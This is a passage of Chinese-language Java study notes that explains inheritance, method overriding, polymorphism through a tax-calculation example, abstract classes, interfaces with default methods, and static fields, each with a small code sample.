<li>练习：新增子类PrimaryStudent，继承自父类Studen。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NewSon</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Perso p = <span class="keyword">new</span> Perso(<span class="string">&quot;小明&quot;</span>, <span class="number">12</span>);</span><br><span class="line">        Studen s = <span class="keyword">new</span> Studen(<span class="string">&quot;小红&quot;</span>, <span class="number">20</span>, <span class="number">99</span>);</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> 定义PrimaryStudent，从Studen继承，新增grade字段:</span></span><br><span class="line">        PrimaryStudent ps = <span class="keyword">new</span> PrimaryStudent(<span class="string">&quot;小军&quot;</span>, <span class="number">9</span>, <span class="number">100</span>, <span class="number">5</span>);</span><br><span class="line">        System.out.println(ps.getName());</span><br><span class="line">        System.out.println(ps.getAge());</span><br><span class="line">        System.out.println(ps.getScore());</span><br><span class="line">        System.out.println(ps.getGrade());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Perso</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> String name; <span class="comment">//protected可由子类继承</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Perso</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    	<span class="keyword">return</span> name; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123; </span><br><span class="line">    	<span class="keyword">this</span>.name = name; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    	<span class="keyword">return</span> age; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123; </span><br><span class="line">    	<span class="keyword">this</span>.age = age; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Studen</span> <span class="keyword">extends</span> <span class="title">Perso</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> score;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Studen</span><span class="params">(String name, <span class="keyword">int</span> age, <span class="keyword">int</span> score)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(name, age); <span class="comment">//调用父类Perso的构造方法</span></span><br><span class="line">        <span class="keyword">this</span>.score = score;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getScore</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    	<span class="keyword">return</span> score; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PrimaryStudent</span> <span class="keyword">extends</span> <span class="title">Studen</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> grade;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PrimaryStudent</span><span class="params">(String name, <span class="keyword">int</span> age, <span class="keyword">int</span> score, <span class="keyword">int</span> grade)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(name, age,score); <span class="comment">//调用父类Studen的构造方法</span></span><br><span class="line">        <span class="keyword">this</span>.grade = grade;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getGrade</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    	<span class="keyword">return</span> grade; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h3></li>
<li>复写<br>在继承关系中，子类如果定义了一个与父类方法签名<code>完全相同</code>的方法，被称为覆写（Override）。<br><code>完全相同</code>指的是：参数和返回值都完全相同。<br>举例：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Override</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Psons p = <span class="keyword">new</span> Studt();</span><br><span class="line">        p.run(); <span class="comment">// 打印结果是Studt.run 因为p指向的是Studt实例</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Psons</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Pson.run&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Studt</span> <span class="keyword">extends</span> <span class="title">Psons</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123; <span class="comment">//子类复写了父类的方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Studt.run&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>多态<br>多态的特性就是，运行期才能动态决定调用的子类方法。对某个类型调用某个方法，执行的实际方法可能是某个子类的覆写方法。<br>举例：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PracticeOverride</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 给一个有普通收入、工资收入和享受国务院特殊津贴的小伙伴算税:</span></span><br><span class="line">        Income[] incomes = <span class="keyword">new</span> Income[] &#123; <span class="comment">//将普通收入、工资收入和享受国务院特殊津贴这三类收入初始化为一个数组，数组元素初始化调用了相应的构造方法</span></span><br><span class="line">            <span class="keyword">new</span> Income(<span class="number">3000</span>),</span><br><span class="line">            <span class="keyword">new</span> Salary(<span class="number">7500</span>),</span><br><span class="line">            <span class="keyword">new</span> StateCouncilSpecialAllowance(<span class="number">15000</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        System.out.println(totalTax(incomes));</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">double</span> <span class="title">totalTax</span><span class="params">(Income... incomes)</span> </span>&#123; <span class="comment">//计算总纳税额的方法</span></span><br><span class="line">        <span class="keyword">double</span> total = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Income income: incomes) &#123; <span class="comment">//用for each对数组做遍历</span></span><br><span class="line">            total = total + income.getTax(); <span class="comment">//调用计算纳税额的方法</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Income</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">double</span> income;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Income</span><span class="params">(<span class="keyword">double</span> income)</span> </span>&#123; <span class="comment">//Income的构造方法</span></span><br><span class="line">        <span class="keyword">this</span>.income = income;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getTax</span><span class="params">()</span> </span>&#123; <span class="comment">//计算纳税额的方法</span></span><br><span class="line">        <span class="keyword">return</span> income * <span class="number">0.1</span>; <span class="comment">// 税率10%</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Salary</span> <span class="keyword">extends</span> <span class="title">Income</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Salary</span><span class="params">(<span class="keyword">double</span> income)</span> </span>&#123; <span class="comment">//Salary的构造方法</span></span><br><span class="line">        <span class="keyword">super</span>(income); <span class="comment">//Salary构造方法的第一句必须调用父类Income的构造方法</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getTax</span><span class="params">()</span> </span>&#123; <span class="comment">//计算纳税额的方法</span></span><br><span class="line">        <span class="keyword">if</span> (income &lt;= <span class="number">5000</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (income - <span class="number">5000</span>) * <span class="number">0.2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StateCouncilSpecialAllowance</span> <span class="keyword">extends</span> <span class="title">Income</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">StateCouncilSpecialAllowance</span><span class="params">(<span class="keyword">double</span> income)</span> </span>&#123; <span class="comment">//StateCouncilSpecialAllowance的构造方法</span></span><br><span class="line">        <span class="keyword">super</span>(income); <span class="comment">//StateCouncilSpecialAllowance构造方法的第一句必须调用父类Income的构造方法</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getTax</span><span class="params">()</span> </span>&#123; <span class="comment">//计算纳税额的方法</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
运行结果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc4d576nngj31f60u0jvx.jpg" alt="image.png"><br><del>脑子不好使了，明天再来……</del><br>利用多态，totalTax()方法只需要和Income打交道，它完全不需要知道Salary和StateCouncilSpecialAllowance的存在，就可以正确计算出总的税。如果我们要新增一种稿费收入，只需要从Income派生，然后正确覆写getTax()方法就可以。把新的类型传入totalTax()，不需要修改任何代码。<br>比如我们新增稿费收入article。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PracticeOverride</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 给一个有普通收入、工资收入和享受国务院特殊津贴的小伙伴算税:</span></span><br><span class="line">        Income[] incomes = <span class="keyword">new</span> Income[] &#123;</span><br><span class="line">            <span class="keyword">new</span> Income(<span class="number">3000</span>),</span><br><span class="line">            <span class="keyword">new</span> Salary(<span class="number">7500</span>),</span><br><span class="line">            <span class="keyword">new</span> StateCouncilSpecialAllowance(<span class="number">15000</span>),</span><br><span class="line">            <span class="keyword">new</span> article(<span class="number">2000</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        System.out.println(totalTax(incomes));</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">double</span> <span class="title">totalTax</span><span class="params">(Income... incomes)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">double</span> total = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Income income: incomes) &#123;</span><br><span class="line">            total = total + income.getTax();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Income</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">double</span> income;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Income</span><span class="params">(<span class="keyword">double</span> income)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.income = income;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getTax</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> income * <span class="number">0.1</span>; <span class="comment">// 税率10%</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Salary</span> <span class="keyword">extends</span> <span class="title">Income</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Salary</span><span class="params">(<span class="keyword">double</span> income)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(income);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getTax</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (income &lt;= <span class="number">5000</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (income - <span class="number">5000</span>) * <span class="number">0.2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StateCouncilSpecialAllowance</span> <span class="keyword">extends</span> <span class="title">Income</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">StateCouncilSpecialAllowance</span><span class="params">(<span class="keyword">double</span> income)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(income);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getTax</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">article</span> <span class="keyword">extends</span> <span class="title">Income</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">article</span><span class="params">(<span class="keyword">double</span> income)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(income);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getTax</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> income * <span class="number">0.2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>复写Object方法<br>所有的class最终都继承自Object，而Object定义了以下重要的方法：<br><code>toString()</code>：把instance输出为String；<br><code>equals()</code>：判断两个instance是否逻辑相等；<br><code>hashCode()</code>：计算一个instance的哈希值。</li>
<li>调用super<br>在子类的覆写方法中，如果要调用父类的被覆写的方法，可以通过super来调用。</li>
<li>final<br>如果一个父类不允许子类对它的某个方法进行覆写，可以把该方法标记为final。用final修饰的方法不能被Override。<h3 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h3></li>
<li>抽象类<br>如果一个class定义了方法，但没有具体执行代码，这个方法就是抽象方法，抽象方法用abstract修饰。<br>我们无法实例化一个抽象类。<br>抽象类可以强迫子类实现其定义的抽象方法，否则编译会报错。因此，抽象方法实际上相当于定义了“规范”。<br>举例：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Abstract</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Pe p = <span class="keyword">new</span> Studs();</span><br><span class="line">        p.run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Pe</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>; <span class="comment">//相当于定义一个规范，要求子类必须调用run()方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Studs</span> <span class="keyword">extends</span> <span class="title">Pe</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123; <span class="comment">//子类Studs必须调用父类的run()方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Student.run&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
运行结果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc6dv6klecj31f60u0q78.jpg" alt="image.png"></li>
<li>面向抽象编程<br>这种尽量引用高层类型，避免引用实际子类型的方式，称之为面向抽象编程。<br>面向抽象编程的本质就是：</li>
</ul>
<ol>
<li>上层代码只定义规范（例如：<code>abstract class Person</code>）；</li>
<li>不需要子类就可以实现业务逻辑（正常编译）；</li>
<li>具体的业务逻辑由不同的子类实现，调用者并不关心。<br>举例：<br>当我们定义了抽象类Person，以及具体的Student、Teacher子类的时候，我们可以通过抽象类Person类型去引用具体的子类的实例：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Person s = <span class="keyword">new</span> Student();</span><br><span class="line">Person t = <span class="keyword">new</span> Teacher();</span><br></pre></td></tr></table></figure>
这种引用抽象类的好处在于，我们对其进行方法调用，并不关心Person类型变量的具体子类型：<br>// 不关心Person变量的具体子类型:<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">s.run();</span><br><span class="line">t.run();</span><br></pre></td></tr></table></figure>
<h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3>所谓interface，就是比抽象类还要抽象的纯抽象接口，因为它连字段都不能有。因为接口定义的所有方法默认都是public abstract的，所以这两个修饰符不需要写出来（写不写效果都一样）。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Person</span> </span>&#123; <span class="comment">//定义接口</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">String <span class="title">getName</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
当一个具体的class去实现一个interface时，需要使用implements关键字。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Person</span> </span>&#123; <span class="comment">//Student类实现接口Person</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">//实现接口Person的run()方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.name + <span class="string">&quot; run&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">//实现接口Person的getName()方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
一个类可以实现多个interface。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Person</span>, <span class="title">Hello</span> </span>&#123; <span class="comment">// 实现了两个interface</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>抽象类和接口的对比：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc6ed9f5k1j30z00blaal.jpg" alt="image.png"></li>
<li>接口继承<br>interface继承自interface使用extends，它相当于扩展了接口的方法。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Person</span> <span class="keyword">extends</span> <span class="title">Hello</span> </span>&#123; <span class="comment">//Person接口继承了Hello接口</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">String <span class="title">getName</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>default方法<br>default方法的目的是，当我们需要给接口新增一个方法时，会涉及到修改全部子类。如果新增的是default方法，那么子类就不必全部修改，只需要在需要覆写的地方去覆写新增方法。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Default</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        P p = <span class="keyword">new</span> S(<span class="string">&quot;Xiao Ming&quot;</span>);</span><br><span class="line">        P p2 = <span class="keyword">new</span> W(<span class="string">&quot;dana&quot;</span>); <span class="comment">//类W继承自接口P，它可以调用接口P新增的default方法run2()</span></span><br><span class="line">        p.run();</span><br><span class="line">        p2.run2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">P</span> </span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">getName</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(getName() + <span class="string">&quot; run&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">run2</span><span class="params">()</span> </span>&#123; <span class="comment">//接口P新增default方法run2()</span></span><br><span class="line">    	System.out.println(getName() + <span class="string">&quot; run2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span> <span class="keyword">implements</span> <span class="title">P</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">S</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">W</span> <span class="keyword">implements</span> <span class="title">P</span> </span>&#123; <span class="comment">//类W继承自接口P</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">W</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
运行结果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc6eobv6uvj31f60u0q7c.jpg" alt="image.png"><h3 id="静态字段和静态方法"><a href="#静态字段和静态方法" class="headerlink" title="静态字段和静态方法"></a>静态字段和静态方法</h3>在一个class中定义的字段，我们称之为实例字段。实例字段的特点是，每个实例都有独立的字段，各个实例的同名字段互不影响。<br>用static修饰的字段，称为静态字段：static field。<br>实例字段在每个实例中都有自己的一个独立“空间”，但是静态字段只有一个共享“空间”，所有实例都会共享该字段。</li>
<li>静态字段<br>举例：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StaticField</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Pns ming = <span class="keyword">new</span> Pns(<span class="string">&quot;Xiao Ming&quot;</span>, <span class="number">12</span>);</span><br><span class="line">        Pns hong = <span class="keyword">new</span> Pns(<span class="string">&quot;Xiao Hong&quot;</span>, <span class="number">15</span>);</span><br><span class="line">        ming.number = <span class="number">88</span>; <span class="comment">//使用静态字段number</span></span><br><span class="line">        System.out.println(hong.number);</span><br><span class="line">        hong.number = <span class="number">99</span>;</span><br><span class="line">        System.out.println(ming.number);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pns</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> number; <span class="comment">//静态字段</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Pns</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
运行结果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc6evtuitoj31f60u0jvu.jpg" alt="image.png"><blockquote>
<p>不推荐用实例变量.静态字段去访问静态字段，因为在Java程序中，实例对象并没有静态字段。在代码中，实例对象能访问静态字段只是因为编译器可以根据实例类型自动转换为类名.静态字段来访问静态对象。<br>推荐用类名来访问静态字段。可以把静态字段理解为描述class本身的字段（非实例字段）。</p>
</blockquote>
</li>
</ul>
<p>推荐写法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StaticField</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Pns ming = <span class="keyword">new</span> Pns(<span class="string">&quot;Xiao Ming&quot;</span>, <span class="number">12</span>);</span><br><span class="line">        Pns hong = <span class="keyword">new</span> Pns(<span class="string">&quot;Xiao Hong&quot;</span>, <span class="number">15</span>);</span><br><span class="line">        Pns.number = <span class="number">99</span>;</span><br><span class="line">        System.out.println(hong.number);</span><br><span class="line">        System.out.println(ming.number);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pns</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> number;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Pns</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span 